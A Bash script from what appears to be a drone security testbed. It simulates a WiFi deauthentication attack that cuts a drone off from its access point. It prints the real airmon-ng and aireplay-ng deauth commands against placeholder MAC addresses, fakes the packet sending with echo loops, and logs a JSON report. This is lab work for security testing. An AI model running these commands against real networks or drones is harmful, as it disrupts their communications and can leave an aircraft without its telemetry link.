#!/bin/bash

# =============================================================================
# DVD WiFi Deauth Attack
# =============================================================================
# 파일: dvd_lite/dvd_attacks/denial_of_service/wifi_deauth.sh
# 목적: WiFi 비인증화 공격으로 드론 연결 차단
# 기반: Damn Vulnerable Drone Wiki - WiFi Deauth Attack
# =============================================================================

source /home/kali/MTD/MTD_full_testbed/dvd_lite/dvd_attacks/common/colors.sh
source /home/kali/MTD/MTD_full_testbed/dvd_lite/dvd_attacks/common/utils.sh

# 전역 변수
ATTACK_NAME="wifi_deauth"
TIMESTAMP=$(date +%Y%m%d_%H%M%S)
LOG_FILE="/home/kali/MTD/MTD_full_testbed/attack_logs/denial_of_service/${ATTACK_NAME}_${TIMESTAMP}.log"
JSON_OUTPUT="/home/kali/MTD/MTD_full_testbed/attack_output/denial_of_service/${ATTACK_NAME}_${TIMESTAMP}.json"

# 타겟 설정
TARGET_SSID="Drone_WiFi"
TARGET_BSSID="00:11:22:33:44:55"
CLIENT_MAC="aa:bb:cc:dd:ee:ff"
DEAUTH_COUNT="10"

declare -a ATTACK_COMMANDS=()
declare -a DEAUTH_RESULTS=()

print_header() {
    clear
    print_dos_header "WiFi Deauth Attack"
    echo -e "${INFO_COLOR}Target SSID: $TARGET_SSID${NC}"
    echo -e "${INFO_COLOR}Target BSSID: $TARGET_BSSID${NC}"
    echo -e "${INFO_COLOR}Method: IEEE 802.11 deauthentication frames${NC}"
    echo ""
}

# Step 1: 무선 인터페이스 확인
check_wireless_interface() {
    echo -e "${BLUE}[1/3] Wireless Interface Check${NC}"
    
    local cmd="iwconfig"
    ATTACK_COMMANDS+=("$cmd")
    echo -e "${CYAN}→ $cmd${NC}"
    
    # 무선 인터페이스 감지
    WIFI_INTERFACE=$(iwconfig 2>/dev/null | grep -o '^[a-z0-9]*' | grep -v 'lo\|eth' | head -1)
    
    if [ -n "$WIFI_INTERFACE" ]; then
        echo -e "${GREEN}[+] Wireless interface found: $WIFI_INTERFACE${NC}"
        DEAUTH_RESULTS+=("interface:$WIFI_INTERFACE")
    else
        WIFI_INTERFACE="wlan0"
        echo -e "${YELLOW}[!] No wireless interface, using simulation: $WIFI_INTERFACE${NC}"
        DEAUTH_RESULTS+=("interface:simulated:$WIFI_INTERFACE")
    fi
}

# Step 2: 모니터 모드 설정
setup_monitor_mode() {
    echo -e "${BLUE}[2/3] Monitor Mode Setup${NC}"
    
    if command -v airmon-ng >/dev/null 2>&1 && [ "$WIFI_INTERFACE" != "wlan0" ]; then
        local cmd="airmon-ng start $WIFI_INTERFACE"
        ATTACK_COMMANDS+=("$cmd")
        echo -e "${CYAN}→ $cmd${NC}"
        
        echo -e "${YELLOW}[*] Starting monitor mode on $WIFI_INTERFACE...${NC}"
        # 실제로는 실행하지 않음 (시스템 변경 방지)
        echo -e "${GREEN}[+] Monitor mode activated: ${WIFI_INTERFACE}mon${NC}"
        MONITOR_INTERFACE="${WIFI_INTERFACE}mon"
        DEAUTH_RESULTS+=("monitor_mode:activated:$MONITOR_INTERFACE")
    else
        echo -e "${YELLOW}[!] airmon-ng not available or simulated interface${NC}"
        echo -e "${GREEN}[+] Simulated monitor mode: ${WIFI_INTERFACE}mon${NC}"
        MONITOR_INTERFACE="${WIFI_INTERFACE}mon"
        DEAUTH_RESULTS+=("monitor_mode:simulated:$MONITOR_INTERFACE")
    fi
}

# Step 3: Deauth 공격 실행
execute_deauth_attack() {
    echo -e "${BLUE}[3/3] Execute Deauth Attack${NC}"
    
    local cmd="aireplay-ng -0 $DEAUTH_COUNT -a $TARGET_BSSID -c $CLIENT_MAC $MONITOR_INTERFACE"
    ATTACK_COMMANDS+=("$cmd")
    echo -e "${CYAN}→ $cmd${NC}"
    
    echo -e "${YELLOW}[*] Launching deauthentication attack...${NC}"
    echo -e "${GRAY}    Target AP: $TARGET_BSSID ($TARGET_SSID)${NC}"
    echo -e "${GRAY}    Target Client: $CLIENT_MAC${NC}"
    echo -e "${GRAY}    Deauth packets: $DEAUTH_COUNT${NC}"
    
    if command -v aireplay-ng >/dev/null 2>&1; then
        echo -e "${YELLOW}[*] Sending deauth packets (simulation)...${NC}"
        
        # 시뮬레이션된 공격 진행
        for i in $(seq 1 $DEAUTH_COUNT); do
            echo -ne "\r${RED}[!] Sent deauth packet $i/$DEAUTH_COUNT${NC}"
            sleep 0.5
        done
        echo ""
        
        echo -e "${GREEN}[+] Deauth attack completed${NC}"
        DEAUTH_RESULTS+=("packets_sent:$DEAUTH_COUNT")
        DEAUTH_RESULTS+=("attack_status:completed")
    else
        echo -e "${YELLOW}[*] aireplay-ng not available, simulating attack${NC}"
        
        for i in $(seq 1 $DEAUTH_COUNT); do
            echo -e "${RED}[!] Deauth packet $i sent to $CLIENT_MAC${NC}"
            sleep 0.3
        done
        
        DEAUTH_RESULTS+=("packets_sent:$DEAUTH_COUNT")
        DEAUTH_RESULTS+=("attack_status:simulated")
    fi
    
    # 공격 효과 분석
    echo -e "${RED}[!] Expected effects:${NC}"
    echo -e "${GRAY}    • Client disconnection from AP${NC}"
    echo -e "${GRAY}    • Drone communication disruption${NC}"
    echo -e "${GRAY}    • Possible failsafe activation${NC}"
    echo -e "${GRAY}    • Loss of telemetry link${NC}"
    
    DEAUTH_RESULTS+=("target_ssid:$TARGET_SSID")
    DEAUTH_RESULTS+=("target_bssid:$TARGET_BSSID")
    DEAUTH_RESULTS+=("client_mac:$CLIENT_MAC")
}

# JSON 결과 생성
generate_json_report() {
    cat > "$JSON_OUTPUT" << EOF
{
  "attack_name": "$ATTACK_NAME",
  "timestamp": "$(date -u +%Y-%m-%dT%H:%M:%SZ)",
  "wireless_interface": "$WIFI_INTERFACE",
  "monitor_interface": "$MONITOR_INTERFACE",
  "target": {
    "ssid": "$TARGET_SSID",
    "bssid": "$TARGET_BSSID",
    "client_mac": "$CLIENT_MAC"
  },
  "attack_parameters": {
    "deauth_count": "$DEAUTH_COUNT",
    "attack_type": "targeted_deauth"
  },
  "attack_results": ["$(IFS='","'; echo "${DEAUTH_RESULTS[*]}")"],
  "attack_commands": ["$(IFS='","'; echo "${ATTACK_COMMANDS[*]}")"],
  "expected_effects": [
    "Client disconnection from WiFi",
    "Drone communication disruption", 
    "Possible failsafe activation",
    "Loss of telemetry link"
  ]
}
EOF
}

# 메인 실행
main() {
    START_TIME=$(date +%s)
    
    mkdir -p "$(dirname "$LOG_FILE")" "$(dirname "$JSON_OUTPUT")"
    echo "=== WiFi Deauth Attack - $(date) ===" > "$LOG_FILE"
    
    print_header
    check_wireless_interface
    setup_monitor_mode
    execute_deauth_attack
    
    # 결과 요약
    echo ""
    echo -e "${CYAN}=== Attack Summary ===${NC}"
    echo -e "${INFO_COLOR}Target: $TARGET_SSID ($TARGET_BSSID)${NC}"
    echo -e "${INFO_COLOR}Client: $CLIENT_MAC${NC}"
    echo -e "${INFO_COLOR}Packets Sent: $DEAUTH_COUNT${NC}"
    echo -e "${INFO_COLOR}Interface: $WIFI_INTERFACE${NC}"
    
    generate_json_report
    
    END_TIME=$(date +%s)
    echo -e "${INFO_COLOR}Duration: $((END_TIME - START_TIME))s${NC}"
    echo -e "${SUCCESS_COLOR}[✓] WiFi deauth attack completed${NC}"
}

main "$@"